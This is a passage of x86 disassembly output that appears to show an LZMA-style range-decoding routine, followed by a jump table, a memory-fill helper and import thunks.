  407255:	8b 45 64             	mov    0x64(%ebp),%eax
  407258:	2b 45 4c             	sub    0x4c(%ebp),%eax
  40725b:	3b 45 04             	cmp    0x4(%ebp),%eax
  40725e:	72 03                	jb     0x407263
  407260:	03 45 04             	add    0x4(%ebp),%eax
  407263:	8b 55 70             	mov    0x70(%ebp),%edx
  407266:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  407269:	8b 45 64             	mov    0x64(%ebp),%eax
  40726c:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  40726f:	40                   	inc    %eax
  407270:	33 d2                	xor    %edx,%edx
  407272:	f7 75 04             	divl   0x4(%ebp)
  407275:	ff 45 18             	incl   0x18(%ebp)
  407278:	8b 45 10             	mov    0x10(%ebp),%eax
  40727b:	ff 45 10             	incl   0x10(%ebp)
  40727e:	ff 4d 14             	decl   0x14(%ebp)
  407281:	88 4d 1c             	mov    %cl,0x1c(%ebp)
  407284:	88 08                	mov    %cl,(%eax)
  407286:	89 55 64             	mov    %edx,0x64(%ebp)
  407289:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  407290:	e9 ea fa ff ff       	jmp    0x406d7f
  407295:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  407299:	75 05                	jne    0x4072a0
  40729b:	8b 45 50             	mov    0x50(%ebp),%eax
  40729e:	eb 30                	jmp    0x4072d0
  4072a0:	8b 45 40             	mov    0x40(%ebp),%eax
  4072a3:	8d b4 42 c8 01 00 00 	lea    0x1c8(%edx,%eax,2),%esi
  4072aa:	c7 45 f4 0b 00 00 00 	movl   $0xb,-0xc(%ebp)
  4072b1:	e9 76 02 00 00       	jmp    0x40752c
  4072b6:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  4072ba:	75 05                	jne    0x4072c1
  4072bc:	8b 45 54             	mov    0x54(%ebp),%eax
  4072bf:	eb 09                	jmp    0x4072ca
  4072c1:	8b 4d 54             	mov    0x54(%ebp),%ecx
  4072c4:	8b 45 58             	mov    0x58(%ebp),%eax
  4072c7:	89 4d 58             	mov    %ecx,0x58(%ebp)
  4072ca:	8b 4d 50             	mov    0x50(%ebp),%ecx
  4072cd:	89 4d 54             	mov    %ecx,0x54(%ebp)
  4072d0:	8b 4d 4c             	mov    0x4c(%ebp),%ecx
  4072d3:	89 4d 50             	mov    %ecx,0x50(%ebp)
  4072d6:	89 45 4c             	mov    %eax,0x4c(%ebp)
  4072d9:	8d 82 68 0a 00 00    	lea    0xa68(%edx),%eax
  4072df:	89 45 20             	mov    %eax,0x20(%ebp)
  4072e2:	c7 45 f8 15 00 00 00 	movl   $0x15,-0x8(%ebp)
  4072e9:	e9 f6 fe ff ff       	jmp    0x4071e4
  4072ee:	33 c0                	xor    %eax,%eax
  4072f0:	83 7d 40 07          	cmpl   $0x7,0x40(%ebp)
  4072f4:	0f 9d c0             	setge  %al
  4072f7:	48                   	dec    %eax
  4072f8:	83 e0 fd             	and    $0xfffffffd,%eax
  4072fb:	83 c0 0b             	add    $0xb,%eax
  4072fe:	89 45 40             	mov    %eax,0x40(%ebp)
  407301:	e9 96 01 00 00       	jmp    0x40749c
  407306:	8b 45 48             	mov    0x48(%ebp),%eax
  407309:	83 f8 04             	cmp    $0x4,%eax
  40730c:	7c 03                	jl     0x407311
  40730e:	6a 03                	push   $0x3
  407310:	58                   	pop    %eax
  407311:	c1 e0 07             	shl    $0x7,%eax
  407314:	8d 84 10 60 03 00 00 	lea    0x360(%eax,%edx,1),%eax
  40731b:	89 45 20             	mov    %eax,0x20(%ebp)
  40731e:	c7 45 38 06 00 00 00 	movl   $0x6,0x38(%ebp)
  407325:	c7 45 fc 19 00 00 00 	movl   $0x19,-0x4(%ebp)
  40732c:	e9 bf 02 00 00       	jmp    0x4075f0
  407331:	83 fb 04             	cmp    $0x4,%ebx
  407334:	7c 35                	jl     0x40736b
  407336:	8b cb                	mov    %ebx,%ecx
  407338:	8b c3                	mov    %ebx,%eax
  40733a:	83 e0 01             	and    $0x1,%eax
  40733d:	d1 f9                	sar    $1,%ecx
  40733f:	49                   	dec    %ecx
  407340:	83 c8 02             	or     $0x2,%eax
  407343:	d3 e0                	shl    %cl,%eax
  407345:	83 fb 0e             	cmp    $0xe,%ebx
  407348:	89 45 4c             	mov    %eax,0x4c(%ebp)
  40734b:	7d 14                	jge    0x407361
  40734d:	2b c3                	sub    %ebx,%eax
  40734f:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  407356:	89 45 20             	mov    %eax,0x20(%ebp)
  407359:	89 4d 38             	mov    %ecx,0x38(%ebp)
  40735c:	e9 82 00 00 00       	jmp    0x4073e3
  407361:	33 db                	xor    %ebx,%ebx
  407363:	83 c1 fc             	add    $0xfffffffc,%ecx
  407366:	89 4d 30             	mov    %ecx,0x30(%ebp)
  407369:	eb 33                	jmp    0x40739e
  40736b:	89 5d 4c             	mov    %ebx,0x4c(%ebp)
  40736e:	e9 26 01 00 00       	jmp    0x407499
  407373:	8b 45 4c             	mov    0x4c(%ebp),%eax
  407376:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40737a:	0f 84 70 03 00 00    	je     0x4076f0
  407380:	8b 7d 08             	mov    0x8(%ebp),%edi
  407383:	8b 4d 6c             	mov    0x6c(%ebp),%ecx
  407386:	0f b6 3f             	movzbl (%edi),%edi
  407389:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  40738d:	ff 4d 0c             	decl   0xc(%ebp)
  407390:	c1 e1 08             	shl    $0x8,%ecx
  407393:	0b cf                	or     %edi,%ecx
  407395:	ff 45 08             	incl   0x8(%ebp)
  407398:	89 4d 6c             	mov    %ecx,0x6c(%ebp)
  40739b:	ff 4d 30             	decl   0x30(%ebp)
  40739e:	83 7d 30 00          	cmpl   $0x0,0x30(%ebp)
  4073a2:	7e 27                	jle    0x4073cb
  4073a4:	8b 4d 6c             	mov    0x6c(%ebp),%ecx
  4073a7:	d1 6d 68             	shrl   $1,0x68(%ebp)
  4073aa:	03 db                	add    %ebx,%ebx
  4073ac:	89 5d 34             	mov    %ebx,0x34(%ebp)
  4073af:	3b 4d 68             	cmp    0x68(%ebp),%ecx
  4073b2:	72 0c                	jb     0x4073c0
  4073b4:	2b 4d 68             	sub    0x68(%ebp),%ecx
  4073b7:	83 cb 01             	or     $0x1,%ebx
  4073ba:	89 4d 6c             	mov    %ecx,0x6c(%ebp)
  4073bd:	89 5d 34             	mov    %ebx,0x34(%ebp)
  4073c0:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  4073c7:	73 d2                	jae    0x40739b
  4073c9:	eb ab                	jmp    0x407376
  4073cb:	c1 e3 04             	shl    $0x4,%ebx
  4073ce:	03 c3                	add    %ebx,%eax
  4073d0:	81 c2 44 06 00 00    	add    $0x644,%edx
  4073d6:	89 45 4c             	mov    %eax,0x4c(%ebp)
  4073d9:	89 55 20             	mov    %edx,0x20(%ebp)
  4073dc:	c7 45 38 04 00 00 00 	movl   $0x4,0x38(%ebp)
  4073e3:	33 db                	xor    %ebx,%ebx
  4073e5:	c7 45 28 01 00 00 00 	movl   $0x1,0x28(%ebp)
  4073ec:	89 5d 34             	mov    %ebx,0x34(%ebp)
  4073ef:	89 5d 30             	mov    %ebx,0x30(%ebp)
  4073f2:	eb 28                	jmp    0x40741c
  4073f4:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4073f8:	0f 84 fb 02 00 00    	je     0x4076f9
  4073fe:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407401:	8b 45 6c             	mov    0x6c(%ebp),%eax
  407404:	0f b6 09             	movzbl (%ecx),%ecx
  407407:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  40740b:	ff 4d 0c             	decl   0xc(%ebp)
  40740e:	c1 e0 08             	shl    $0x8,%eax
  407411:	0b c1                	or     %ecx,%eax
  407413:	ff 45 08             	incl   0x8(%ebp)
  407416:	89 45 6c             	mov    %eax,0x6c(%ebp)
  407419:	ff 45 30             	incl   0x30(%ebp)
  40741c:	8b 45 38             	mov    0x38(%ebp),%eax
  40741f:	39 45 30             	cmp    %eax,0x30(%ebp)
  407422:	7d 72                	jge    0x407496
  407424:	8b 7d 28             	mov    0x28(%ebp),%edi
  407427:	8b 45 20             	mov    0x20(%ebp),%eax
  40742a:	8b 55 68             	mov    0x68(%ebp),%edx
  40742d:	03 ff                	add    %edi,%edi
  40742f:	8d 34 07             	lea    (%edi,%eax,1),%esi
  407432:	0f b7 06             	movzwl (%esi),%eax
  407435:	0f b7 c8             	movzwl %ax,%ecx
  407438:	c1 ea 0b             	shr    $0xb,%edx
  40743b:	0f af d1             	imul   %ecx,%edx
  40743e:	89 75 24             	mov    %esi,0x24(%ebp)
  407441:	39 55 6c             	cmp    %edx,0x6c(%ebp)
  407444:	73 17                	jae    0x40745d
  407446:	89 55 68             	mov    %edx,0x68(%ebp)
  407449:	ba 00 08 00 00       	mov    $0x800,%edx
  40744e:	2b d1                	sub    %ecx,%edx
  407450:	c1 fa 05             	sar    $0x5,%edx
  407453:	03 d0                	add    %eax,%edx
  407455:	d1 65 28             	shll   $1,0x28(%ebp)
  407458:	66 89 16             	mov    %dx,(%esi)
  40745b:	eb 2b                	jmp    0x407488
  40745d:	29 55 68             	sub    %edx,0x68(%ebp)
  407460:	29 55 6c             	sub    %edx,0x6c(%ebp)
  407463:	33 c9                	xor    %ecx,%ecx
  407465:	41                   	inc    %ecx
  407466:	8b d9                	mov    %ecx,%ebx
  407468:	8b 4d 30             	mov    0x30(%ebp),%ecx
  40746b:	d3 e3                	shl    %cl,%ebx
  40746d:	8b cb                	mov    %ebx,%ecx
  40746f:	8b 5d 34             	mov    0x34(%ebp),%ebx
  407472:	0b d9                	or     %ecx,%ebx
  407474:	66 8b c8             	mov    %ax,%cx
  407477:	66 c1 e9 05          	shr    $0x5,%cx
  40747b:	66 2b c1             	sub    %cx,%ax
  40747e:	47                   	inc    %edi
  40747f:	89 5d 34             	mov    %ebx,0x34(%ebp)
  407482:	66 89 06             	mov    %ax,(%esi)
  407485:	89 7d 28             	mov    %edi,0x28(%ebp)
  407488:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  40748f:	73 88                	jae    0x407419
  407491:	e9 5e ff ff ff       	jmp    0x4073f4
  407496:	01 5d 4c             	add    %ebx,0x4c(%ebp)
  407499:	ff 45 4c             	incl   0x4c(%ebp)
  40749c:	8b 45 4c             	mov    0x4c(%ebp),%eax
  40749f:	85 c0                	test   %eax,%eax
  4074a1:	0f 84 5b 02 00 00    	je     0x407702
  4074a7:	3b 45 18             	cmp    0x18(%ebp),%eax
  4074aa:	0f 87 80 02 00 00    	ja     0x407730
  4074b0:	83 45 48 02          	addl   $0x2,0x48(%ebp)
  4074b4:	8b 45 48             	mov    0x48(%ebp),%eax
  4074b7:	01 45 18             	add    %eax,0x18(%ebp)
  4074ba:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4074be:	0f 84 44 02 00 00    	je     0x407708
  4074c4:	8b 45 64             	mov    0x64(%ebp),%eax
  4074c7:	2b 45 4c             	sub    0x4c(%ebp),%eax
  4074ca:	3b 45 04             	cmp    0x4(%ebp),%eax
  4074cd:	72 03                	jb     0x4074d2
  4074cf:	03 45 04             	add    0x4(%ebp),%eax
  4074d2:	8b 55 70             	mov    0x70(%ebp),%edx
  4074d5:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  4074d8:	8b 45 64             	mov    0x64(%ebp),%eax
  4074db:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  4074de:	40                   	inc    %eax
  4074df:	33 d2                	xor    %edx,%edx
  4074e1:	f7 75 04             	divl   0x4(%ebp)
  4074e4:	8b 45 10             	mov    0x10(%ebp),%eax
  4074e7:	ff 45 10             	incl   0x10(%ebp)
  4074ea:	ff 4d 14             	decl   0x14(%ebp)
  4074ed:	ff 4d 48             	decl   0x48(%ebp)
  4074f0:	83 7d 48 00          	cmpl   $0x0,0x48(%ebp)
  4074f4:	88 4d 1c             	mov    %cl,0x1c(%ebp)
  4074f7:	88 08                	mov    %cl,(%eax)
  4074f9:	89 55 64             	mov    %edx,0x64(%ebp)
  4074fc:	7f bc                	jg     0x4074ba
  4074fe:	e9 86 fd ff ff       	jmp    0x407289
  407503:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  407507:	75 16                	jne    0x40751f
  407509:	8b 45 2c             	mov    0x2c(%ebp),%eax
  40750c:	83 65 48 00          	andl   $0x0,0x48(%ebp)
  407510:	8b 4d 20             	mov    0x20(%ebp),%ecx
  407513:	c1 e0 04             	shl    $0x4,%eax
  407516:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  40751a:	e9 a9 00 00 00       	jmp    0x4075c8
  40751f:	8b 75 20             	mov    0x20(%ebp),%esi
  407522:	83 c6 02             	add    $0x2,%esi
  407525:	c7 45 f4 13 00 00 00 	movl   $0x13,-0xc(%ebp)
  40752c:	89 75 24             	mov    %esi,0x24(%ebp)
  40752f:	0f b7 06             	movzwl (%esi),%eax
  407532:	8b 4d 68             	mov    0x68(%ebp),%ecx
  407535:	0f b7 f8             	movzwl %ax,%edi
  407538:	c1 e9 0b             	shr    $0xb,%ecx
  40753b:	0f af cf             	imul   %edi,%ecx
  40753e:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  407541:	73 18                	jae    0x40755b
  407543:	89 4d 68             	mov    %ecx,0x68(%ebp)
  407546:	b9 00 08 00 00       	mov    $0x800,%ecx
  40754b:	2b cf                	sub    %edi,%ecx
  40754d:	c1 f9 05             	sar    $0x5,%ecx
  407550:	03 c8                	add    %eax,%ecx
  407552:	83 65 38 00          	andl   $0x0,0x38(%ebp)
  407556:	66 89 0e             	mov    %cx,(%esi)
  407559:	eb 1a                	jmp    0x407575
  40755b:	29 4d 68             	sub    %ecx,0x68(%ebp)
  40755e:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  407561:	66 8b c8             	mov    %ax,%cx
  407564:	66 c1 e9 05          	shr    $0x5,%cx
  407568:	66 2b c1             	sub    %cx,%ax
  40756b:	66 89 06             	mov    %ax,(%esi)
  40756e:	c7 45 38 01 00 00 00 	movl   $0x1,0x38(%ebp)
  407575:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  40757c:	73 25                	jae    0x4075a3
  40757e:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  407582:	0f 84 89 01 00 00    	je     0x407711
  407588:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40758b:	8b 45 6c             	mov    0x6c(%ebp),%eax
  40758e:	0f b6 09             	movzbl (%ecx),%ecx
  407591:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  407595:	ff 4d 0c             	decl   0xc(%ebp)
  407598:	c1 e0 08             	shl    $0x8,%eax
  40759b:	0b c1                	or     %ecx,%eax
  40759d:	ff 45 08             	incl   0x8(%ebp)
  4075a0:	89 45 6c             	mov    %eax,0x6c(%ebp)
  4075a3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4075a6:	e9 fe 00 00 00       	jmp    0x4076a9
  4075ab:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  4075af:	75 23                	jne    0x4075d4
  4075b1:	8b 45 2c             	mov    0x2c(%ebp),%eax
  4075b4:	8b 4d 20             	mov    0x20(%ebp),%ecx
  4075b7:	c1 e0 04             	shl    $0x4,%eax
  4075ba:	c7 45 48 08 00 00 00 	movl   $0x8,0x48(%ebp)
  4075c1:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  4075c8:	89 45 20             	mov    %eax,0x20(%ebp)
  4075cb:	c7 45 38 03 00 00 00 	movl   $0x3,0x38(%ebp)
  4075d2:	eb 15                	jmp    0x4075e9
  4075d4:	81 45 20 04 02 00 00 	addl   $0x204,0x20(%ebp)
  4075db:	c7 45 48 10 00 00 00 	movl   $0x10,0x48(%ebp)
  4075e2:	c7 45 38 08 00 00 00 	movl   $0x8,0x38(%ebp)
  4075e9:	c7 45 fc 14 00 00 00 	movl   $0x14,-0x4(%ebp)
  4075f0:	8b 45 38             	mov    0x38(%ebp),%eax
  4075f3:	c7 45 28 01 00 00 00 	movl   $0x1,0x28(%ebp)
  4075fa:	89 45 30             	mov    %eax,0x30(%ebp)
  4075fd:	eb 2b                	jmp    0x40762a
  4075ff:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  407603:	0f 84 11 01 00 00    	je     0x40771a
  407609:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40760c:	8b 45 6c             	mov    0x6c(%ebp),%eax
  40760f:	0f b6 09             	movzbl (%ecx),%ecx
  407612:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  407616:	ff 4d 0c             	decl   0xc(%ebp)
  407619:	c1 e0 08             	shl    $0x8,%eax
  40761c:	0b c1                	or     %ecx,%eax
  40761e:	ff 45 08             	incl   0x8(%ebp)
  407621:	89 45 6c             	mov    %eax,0x6c(%ebp)
  407624:	ff 4d 30             	decl   0x30(%ebp)
  407627:	8b 55 74             	mov    0x74(%ebp),%edx
  40762a:	83 7d 30 00          	cmpl   $0x0,0x30(%ebp)
  40762e:	7e 5e                	jle    0x40768e
  407630:	8b 55 28             	mov    0x28(%ebp),%edx
  407633:	8b 45 20             	mov    0x20(%ebp),%eax
  407636:	8b 4d 68             	mov    0x68(%ebp),%ecx
  407639:	03 d2                	add    %edx,%edx
  40763b:	8d 34 02             	lea    (%edx,%eax,1),%esi
  40763e:	0f b7 06             	movzwl (%esi),%eax
  407641:	0f b7 f8             	movzwl %ax,%edi
  407644:	c1 e9 0b             	shr    $0xb,%ecx
  407647:	0f af cf             	imul   %edi,%ecx
  40764a:	89 75 24             	mov    %esi,0x24(%ebp)
  40764d:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  407650:	73 17                	jae    0x407669
  407652:	89 4d 68             	mov    %ecx,0x68(%ebp)
  407655:	b9 00 08 00 00       	mov    $0x800,%ecx
  40765a:	2b cf                	sub    %edi,%ecx
  40765c:	c1 f9 05             	sar    $0x5,%ecx
  40765f:	03 c8                	add    %eax,%ecx
  407661:	d1 65 28             	shll   $1,0x28(%ebp)
  407664:	66 89 0e             	mov    %cx,(%esi)
  407667:	eb 17                	jmp    0x407680
  407669:	29 4d 68             	sub    %ecx,0x68(%ebp)
  40766c:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  40766f:	66 8b c8             	mov    %ax,%cx
  407672:	66 c1 e9 05          	shr    $0x5,%cx
  407676:	66 2b c1             	sub    %cx,%ax
  407679:	42                   	inc    %edx
  40767a:	66 89 06             	mov    %ax,(%esi)
  40767d:	89 55 28             	mov    %edx,0x28(%ebp)
  407680:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  407687:	73 9b                	jae    0x407624
  407689:	e9 71 ff ff ff       	jmp    0x4075ff
  40768e:	8b 4d 38             	mov    0x38(%ebp),%ecx
  407691:	8b 5d 28             	mov    0x28(%ebp),%ebx
  407694:	33 c0                	xor    %eax,%eax
  407696:	40                   	inc    %eax
  407697:	d3 e0                	shl    %cl,%eax
  407699:	2b d8                	sub    %eax,%ebx
  40769b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40769e:	89 5d 34             	mov    %ebx,0x34(%ebp)
  4076a1:	eb 06                	jmp    0x4076a9
  4076a3:	01 5d 48             	add    %ebx,0x48(%ebp)
  4076a6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4076a9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4076ac:	e9 d1 f6 ff ff       	jmp    0x406d82
  4076b1:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4076b8:	eb 67                	jmp    0x407721
  4076ba:	c7 45 f0 03 00 00 00 	movl   $0x3,-0x10(%ebp)
  4076c1:	eb 5e                	jmp    0x407721
  4076c3:	c7 45 f0 0d 00 00 00 	movl   $0xd,-0x10(%ebp)
  4076ca:	eb 55                	jmp    0x407721
  4076cc:	c7 45 f0 0e 00 00 00 	movl   $0xe,-0x10(%ebp)
  4076d3:	eb 4c                	jmp    0x407721
  4076d5:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  4076dc:	eb 43                	jmp    0x407721
  4076de:	c7 45 f0 1a 00 00 00 	movl   $0x1a,-0x10(%ebp)
  4076e5:	eb 3a                	jmp    0x407721
  4076e7:	c7 45 f0 1b 00 00 00 	movl   $0x1b,-0x10(%ebp)
  4076ee:	eb 31                	jmp    0x407721
  4076f0:	c7 45 f0 0c 00 00 00 	movl   $0xc,-0x10(%ebp)
  4076f7:	eb 28                	jmp    0x407721
  4076f9:	c7 45 f0 10 00 00 00 	movl   $0x10,-0x10(%ebp)
  407700:	eb 1f                	jmp    0x407721
  407702:	83 4d 48 ff          	orl    $0xffffffff,0x48(%ebp)
  407706:	eb 19                	jmp    0x407721
  407708:	c7 45 f0 1c 00 00 00 	movl   $0x1c,-0x10(%ebp)
  40770f:	eb 10                	jmp    0x407721
  407711:	c7 45 f0 05 00 00 00 	movl   $0x5,-0x10(%ebp)
  407718:	eb 07                	jmp    0x407721
  40771a:	c7 45 f0 18 00 00 00 	movl   $0x18,-0x10(%ebp)
  407721:	8b 7d e8             	mov    -0x18(%ebp),%edi
  407724:	6a 22                	push   $0x22
  407726:	59                   	pop    %ecx
  407727:	8d 75 f0             	lea    -0x10(%ebp),%esi
  40772a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40772c:	33 c0                	xor    %eax,%eax
  40772e:	eb 03                	jmp    0x407733
  407730:	83 c8 ff             	or     $0xffffffff,%eax
  407733:	5b                   	pop    %ebx
  407734:	5f                   	pop    %edi
  407735:	5e                   	pop    %esi
  407736:	83 c5 78             	add    $0x78,%ebp
  407739:	c9                   	leave
  40773a:	c3                   	ret
  40773b:	90                   	nop
  40773c:	95                   	xchg   %eax,%ebp
  40773d:	6d                   	insl   (%dx),%es:(%edi)
  40773e:	40                   	inc    %eax
  40773f:	00 3d 6e 40 00 d9    	add    %bh,0xd900406e
  407745:	6e                   	outsb  %ds:(%esi),(%dx)
  407746:	40                   	inc    %eax
  407747:	00 ab 6e 40 00 2f    	add    %ch,0x2f00406e(%ebx)
  40774d:	75 40                	jne    0x40778f
  40774f:	00 7e 75             	add    %bh,0x75(%esi)
  407752:	40                   	inc    %eax
  407753:	00 f9                	add    %bh,%cl
  407755:	6e                   	outsb  %ds:(%esi),(%dx)
  407756:	40                   	inc    %eax
  407757:	00 93 71 40 00 f3    	add    %dl,-0xcffbf8f(%ebx)
  40775d:	71 40                	jno    0x40779f
  40775f:	00 27                	add    %ah,(%edi)
  407761:	72 40                	jb     0x4077a3
  407763:	00 95 72 40 00 b6    	add    %dl,-0x49ffbf8e(%ebp)
  407769:	72 40                	jb     0x4077ab
  40776b:	00 73 73             	add    %dh,0x73(%ebx)
  40776e:	40                   	inc    %eax
  40776f:	00 8a 6f 40 00 44    	add    %cl,0x4400406f(%edx)
  407775:	70 40                	jo     0x4077b7
  407777:	00 09                	add    %cl,(%ecx)
  407779:	71 40                	jno    0x4077bb
  40777b:	00 f4                	add    %dh,%ah
  40777d:	73 40                	jae    0x4077bf
  40777f:	00 e4                	add    %ah,%ah
  407781:	71 40                	jno    0x4077c3
  407783:	00 03                	add    %al,(%ebx)
  407785:	75 40                	jne    0x4077c7
  407787:	00 ab 75 40 00 a3    	add    %ch,-0x5cffbf8b(%ebx)
  40778d:	76 40                	jbe    0x4077cf
  40778f:	00 ee                	add    %ch,%dh
  407791:	72 40                	jb     0x4077d3
  407793:	00 06                	add    %al,(%esi)
  407795:	73 40                	jae    0x4077d7
  407797:	00 f0                	add    %dh,%al
  407799:	75 40                	jne    0x4077db
  40779b:	00 ff                	add    %bh,%bh
  40779d:	75 40                	jne    0x4077df
  40779f:	00 31                	add    %dh,(%ecx)
  4077a1:	73 40                	jae    0x4077e3
  4077a3:	00 d8                	add    %bl,%al
  4077a5:	70 40                	jo     0x4077e7
  4077a7:	00 4b 72             	add    %cl,0x72(%ebx)
  4077aa:	40                   	inc    %eax
  4077ab:	00 ba 74 40 00 8b    	add    %bh,-0x74ffbf8c(%edx)
  4077b1:	4c                   	dec    %esp
  4077b2:	24 0c                	and    $0xc,%al
  4077b4:	85 c9                	test   %ecx,%ecx
  4077b6:	76 23                	jbe    0x4077db
  4077b8:	8a 44 24 08          	mov    0x8(%esp),%al
  4077bc:	0f b6 c0             	movzbl %al,%eax
  4077bf:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  4077c5:	8b d1                	mov    %ecx,%edx
  4077c7:	53                   	push   %ebx
  4077c8:	57                   	push   %edi
  4077c9:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4077cd:	c1 e9 02             	shr    $0x2,%ecx
  4077d0:	f3 ab                	rep stos %eax,%es:(%edi)
  4077d2:	8b ca                	mov    %edx,%ecx
  4077d4:	83 e1 03             	and    $0x3,%ecx
  4077d7:	f3 aa                	rep stos %al,%es:(%edi)
  4077d9:	5f                   	pop    %edi
  4077da:	5b                   	pop    %ebx
  4077db:	8b 44 24 04          	mov    0x4(%esp),%eax
  4077df:	c3                   	ret
  4077e0:	ff 25 a8 82 40 00    	jmp    *0x4082a8
  4077e6:	ff 25 a4 82 40 00    	jmp    *0x4082a4
  4077ec:	ff 25 a0 82 40 00    	jmp    *0x4082a0
